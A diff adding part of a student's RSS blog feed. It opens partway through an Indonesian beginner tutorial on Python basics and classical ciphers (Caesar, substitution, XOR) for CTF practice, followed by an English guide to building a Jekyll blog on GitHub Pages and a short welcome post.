+<p>Kita sebut saja mereka <strong>hekel kebanyakan micin</strong> atau istilah kerennya sih <strong><del>malkist</del> cracker</strong>. Tapi apa kalian tega jika ilmu yang kalian dapat digunakan untuk merusak?</p>
+<p>Oke, kita lanjut. .</p>
+<p>Pertanyaannya adalah dimana kita dapat mempelajari hal tersebut?</p>
+<p>Jawabannya adalah <del>dihatimu :*</del> disini. Kali ini saya akan memperkenalkan CTF (Capture The Flag) kepada kalian. Bisa kalian baca disini -&gt; <a href="https://yohan.es/ctf/">https://yohan.es/ctf/</a></p>
+<p>Setelah dibaca, kita lanjut membahas materi utama kita :)</p>
+<p><strong>0x02 Dasar Python</strong></p>
+<p>Referensi Pembelajaran/Materi:</p>
+<ol>
+<li><a href="https://www.tutorialspoint.com/python/index.htm">https://www.tutorialspoint.com/python/index.htm</a></li>
+<li><a href="https://www.codecademy.com/learn/learn-python">https://www.codecademy.com/learn/learn-python</a></li>
+<li><a href="https://www.codepolitan.com/tutorial-set/belajar-bahasa-pemrograman-python">https://www.codepolitan.com/tutorial-set/belajar-bahasa-pemrograman-python</a></li>
+<li><a href="https://www.learnpython.org/">https://www.learnpython.org/</a></li>
+<li><a href="https://www.youtube.com/watch?v=cpPG0bKHYKc">https://www.youtube.com/watch?v=cpPG0bKHYKc</a></li>
+</ol>
+<p>Kita kembali ke requirements ya, jadi mohon kerjasamanya url diatas untuk dibuka dan dipelajari :)</p>
+<p>Tapi tenang, saya akan memberi contoh untuk coding python nya hehehe.</p>
+<p>Bagi yang belum punya python, monggo di download <a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a></p>
+<p><strong>Variabel dan Tipe Data</strong></p>
+<p>Variabel berfungsi untuk menyimpan nilai, sedangkan tipe data adalah jenis nilai apakah yang disimpan di database</p>
+<p>Tipe Data:</p>
+<ol>
+<li>Integer (bilangan bulat)</li>
+<li>Float (bilangan pecahan/koma)</li>
+<li>String (teks)</li>
+<li>Boolean (true/false)</li>
+<li>None (kosong)</li>
+</ol>
+<p>Contoh kode (jalankan pada python):</p>
+<pre><code>&lt;code&gt;#ini komentar, tidak akan dieksekusi oleh program
+a = 10 #integer
+print a #keluarkan/output variabel a
+a = 7.5 #float
+print a
+a = &quot;Halo dunia&quot; #string
+print a
+a = True #boolean
+print a
+a = None #none/kosong
+print a
+&lt;/code&gt;
+</code></pre>
+<p><strong>Operator</strong></p>
+<p>Contoh: tambah, kurang, bagi, kali, dan lainnya</p>
+<pre><code>&lt;code&gt;a = 5
+b = 2
+#Operator Aritmatika 
+print a + b
+print a - b
+print a * b #kali
+print a / b #bagi
+print a ** b #pangkat
+print a % b #modulo(sisa pembagian)
+#Operator Pembanding (Hasil cuma true/false)
+print a == b
+print a &gt; b
+print a &lt; b
+print a &gt;= b
+print a &lt;= b
+print a != b
+#Operator Logika (Hasil cuma true/false)
+x = True
+y = False
+print x and y
+print x or y
+print x ^ y #xor
+&lt;/code&gt;
+</code></pre>
+<p><strong>Control Statements</strong></p>
+<p>Jika a maka x</p>
+<pre><code>&lt;code&gt;a = 10
+if a == 10:
+    print &quot;a adalah 10&quot;
+&lt;/code&gt;
+</code></pre>
+<p>Jika a maka x, jika bukan a maka y</p>
+<pre><code>&lt;code&gt;a = 5
+if a == 10:
+    print &quot;a adalah 10&quot;
+else:
+    print &quot;a bukan 10&quot;
+&lt;/code&gt;
+</code></pre>
+<p>Jika a maka x, jika b maka y, jika bukan a dan b maka z</p>
+<pre><code>&lt;code&gt;a = 5
+if a == 10:
+    print &quot;a adalah 10&quot;
+elif a == 5:
+    print &quot;a adalah 5&quot;
+else:
+    print &quot;a bukan 10 dan 5&quot;
+&lt;/code&gt;
+</code></pre>
+<p><strong>Perulangan/Loop</strong></p>
+<p>Misal: Tulislah &ldquo;Halo Dunia&rdquo; sebanyak 10 baris</p>
+<pre><code>&lt;code&gt;a = &quot;Halo Dunia&quot;
+for i in range(0,10):
+    print a
+
+b = &quot;Halo OLC&quot;
+c = 0
+while c &lt; 10:
+    c += 1
+    print b
+&lt;/code&gt;
+</code></pre>
+<p><strong>0x03 Kriptografi</strong></p>
+<p>Misal anda mempunyai kata &ldquo;halo&rdquo; dan ingin memberikan ke teman anda berinisial Mr.Sutards, namun selain Mr.Sutards tidak ada yang boleh mengetahui kata apa yang anda kirimkan. Kita bisa menggunakan Kriptografi untuk menyandikan data :)</p>
+<p>Ada beberapa jenis penyandian:</p>
+<ol>
+<li>Enkripsi</li>
+<li>Encoding</li>
+<li>Hash</li>
+</ol>
+<p>Contoh:</p>
+<p>Data Asli kita sebut Plaintext</p>
+<p>Data Tersandikan kita sebut Ciphertext</p>
+<p>Enkripsi = Plaintext &lt; &mdash;&gt; Algoritma + key &lt; &mdash;&gt; Ciphertext</p>
+<p>Encoding = Plaintext &lt; &mdash;&gt; Algoritma &lt; &mdash;&gt; Ciphertext</p>
+<p>Hash = Plaintext &mdash;&gt; Algoritma &mdash;&gt; Ciphertext (irreversible)</p>
+<p><strong>Caesar Cipher (Geser)</strong></p>
+<p>Misal kita mempunyai plaintext m = &ldquo;halo&rdquo; dan memiliki key k = 2, maka cipher textnya c kita geser/tambahkan digit karakter sebesar key k pada plaintext dari m[i=1] sampai m[L] dimana L adalah jumlah karakter pada plaintext m dan n adalah jumlah/total alphabet dari index &ldquo;a&quot;=0 sampai index &ldquo;z&quot;=25 (n = 26).</p>
+<p><em>Formula/Rumus:</em></p>
+<!-- raw HTML omitted -->
+<blockquote>
+<p>c(m) = (m + k) mod n</p>
+</blockquote>
+<p>m(c ) = ((c - k) + n) mod n</p>
+<blockquote>
+</blockquote>
+<!-- raw HTML omitted -->
+<p>m = &ldquo;halo&rdquo; k = 2 maka c = &ldquo;jcnq&rdquo;</p>
+<p>Contoh simpel menggunakan Python (standar tanpa mod):</p>
+<pre><code>&lt;code&gt;m = &quot;halo&quot;
+c = &quot;&quot;
+k = 2
+for i in m:
+    c += chr(ord(i) + k)
+print c
+&lt;/code&gt;
+</code></pre>
+<p><strong>Subtitution Cipher</strong></p>
+<p>Memasukkan/Mengganti karakter x dengan y</p>
+<p>Contoh:</p>
+<p>a &lt; -&gt; b</p>
+<p>o &lt; -&gt; c</p>
+<p>u &lt; -&gt; d</p>
+<p>m = &ldquo;halo dunia&rdquo;</p>
+<p>maka c = &ldquo;hblc ddnib&rdquo; (karakter a, o, dan u digantikan/subtitusi oleh karakter b, c, dan d)</p>
+<p><strong>XOR Cipher</strong></p>
+<p>xor cipher merupakan kriptografi <strong>modern</strong> dimana metode pengenkripsiannya tidak pada level karakter/alphabet seperti caesar maupun subtitution, akan tetapi pada level bit nya.</p>
+<p><em>XOR Truth Table:</em></p>
+<p>|x| y |output |</p>
+<p>| 1 | 1 | 0 |</p>
+<p>| 1 | 0 | 1 |</p>
+<p>| 0 | 1 | 1 |</p>
+<p>| 0 | 0 | 0 |</p>
+<p>Misal m = &ldquo;halo&rdquo; maka nilai ascii (0-255) masing-masing karakter adalah:</p>
+<p>104, 97, 108, 111</p>
+<p>Maka representasi bilangan basis dua (binary) nya adalah:</p>
+<p>01101000, 01100001, 01101100, 01101111</p>
+<p>Dimisalkan pula key = 10, maka binary nya adalah 00001010 Sehingga ciphernya adalah kita xor kan masing-masing karakter dengan keynya</p>
+<p>h = 104 &mdash;&gt; 01101000 (xor) 00001010 = 01100010 (98)</p>
+<p>a = 97 &mdash;&gt; 01100001 (xor) 00001010 = 01101011 (107)</p>
+<p>l = 108 &mdash;&gt; 01101100 (xor) 00001010 = 01100110 (102)</p>
+<p>o = 111 &mdash;&gt; 01101111 (xor) 00001010 = 01100101 (101)</p>
+<p>Maka kita mendapatkan ciphernya yaitu:</p>
+<p>c = 98, 107, 102, 101</p>
+<p>Kita konversi ke dalam bentuk karakter:</p>
+<p>c = &ldquo;bkfe&rdquo;</p>
+<p><em>Contoh menggunakan python:</em></p>
+<pre><code>&lt;code&gt;m = &quot;halo&quot;
+k = 10
+c = &quot;&quot;
+for i in m:
+    c += chr(ord(i) ^ k)
+print c
+&lt;/code&gt;
+</code></pre>
+<p>Selesai, semoga bermanfaat~</p>
+<p>Thanks to: OmahTI UGM and Aliansi Siber Gadjah Mada</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Create Blog With Github Pages</title>
+            <link>/olc-cyber-security-1-dasar-python-dan-kripto/</link>
+            <pubDate>Fri, 20 Jul 2018 16:28:56 +0000</pubDate>
+            
+            <guid>/olc-cyber-security-1-dasar-python-dan-kripto/</guid>
+            <description>Hi readers, i want to share some tutorials how to create a blog without spending any money :D
+I know we don&#39;t like to spending our money to buy some shit like this hahaha, so this is the best solution for you that want to have a free blog. However, free doesn&#39;t mean easy to do :)
+You need to have some coding skills to create something like this. But don&#39;t worry, i&#39;ll teach you how to do.</description>
+            <content type="html"><![CDATA[<p>Hi readers, i want to share some tutorials how to create a blog without spending any money :D</p>
+<p>I know we don't like to spending our money to buy some shit like this hahaha, so this is the best solution for you that want to have a free blog. However, free doesn't mean easy to do :)</p>
+<p>You need to have some coding skills to create something like this. But don't worry, i'll teach you how to do.</p>
+<p><strong>Requirements</strong></p>
+<ul>
+<li>Ruby Gems</li>
+<li>Jekyll</li>
+<li>Bundler</li>
+</ul>
+<p><strong>How to</strong></p>
+<p>First, install Jekyll and Bundler using ruby gems:</p>
+<pre><code>&lt;code&gt;gem install jekyll bundler
+&lt;/code&gt;
+</code></pre>
+<p>Second, create new project named <code>blog</code>:</p>
+<pre><code>&lt;code&gt;jekyll new blog
+&lt;/code&gt;
+</code></pre>
+<p>You can create or edit a new post on <code>_posts</code> folder and edit your configuration on <code>_config.yml</code> file.</p>
+<p>Third, install github-pages:</p>
+<p>Create a file called <code>Gemfile</code> and paste this into the file:</p>
+<pre><code>&lt;code&gt;source 'https://rubygems.org'
+gem 'github-pages', group:jekyll_plugins
+&lt;/code&gt;
+</code></pre>
+<p>After that, execute this command:</p>
+<pre><code>&lt;code&gt;bundle install
+&lt;/code&gt;
+</code></pre>
+<p>Now, we have to compile and serve:</p>
+<pre><code>&lt;code&gt;bundle exec jekyll serve
+&lt;/code&gt;
+</code></pre>
+<p>Default URL is set to <code>https://localhost:4000/</code> in development.</p>
+<p>Congratulations, you have successfully created your blog :)</p>
+<p>Now, you have to upload to your github repositories. Create a repository named <code>username.github.io</code> and upload your blog folder using git remote or something else.</p>
+<p>Thanks.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Hello world!</title>
+            <link>/hello-world/</link>
+            <pubDate>Fri, 20 Jul 2018 15:23:32 +0000</pubDate>
+            
+            <guid>/hello-world/</guid>
+            <description>Hi, Welcome to My Blog. I’m just an ordinary student from Gadjah Mada University, focusing in Computer Science Major. Love coding and all about technology, especially in Web Development, Backend, and Cyber Security.
+This blog is absolutely meaningless, i just love to write what i like. Maybe i’ll write some tutorials for you or something else that i don’t know why i write that :”(</description>
+            <content type="html"><![CDATA[<p>Hi, Welcome to My Blog.
+I’m just an ordinary student from Gadjah Mada University, focusing in Computer Science Major. Love coding and all about technology, especially in Web Development, Backend, and Cyber Security.</p>
+<p>This blog is absolutely meaningless, i just love to write what i like. Maybe i’ll write some tutorials for you or something else that i don’t know why i write that :”(</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
